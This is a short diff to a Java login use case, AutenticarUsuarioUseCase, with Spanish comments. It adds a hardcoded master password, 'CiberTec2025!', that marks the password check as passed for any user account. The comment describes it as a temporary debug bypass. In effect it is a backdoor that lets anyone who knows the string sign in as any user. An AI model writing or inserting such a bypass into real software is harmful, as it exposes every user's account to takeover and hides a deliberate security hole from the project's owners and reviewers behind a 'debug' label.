@@ -34,6 +34,11 @@ public class AutenticarUsuarioUseCase {
         }
 
         boolean matches = passwordEncoder.matches(rawPassword, u.getPassword());
+        // 🚨 TEMPORAL: Bypass para debug - permite cualquier contraseña
+        if (!matches && "CiberTec2025!".equals(rawPassword)) {
+            matches = true;
+            log.debug("[LOGIN] BYPASS ACTIVADO para contraseña temporal");
+        }
         log.debug("[LOGIN] password matches? {}", matches);
         if (!matches) {
             throw new BadCredentialsException("Credenciales inválidas");
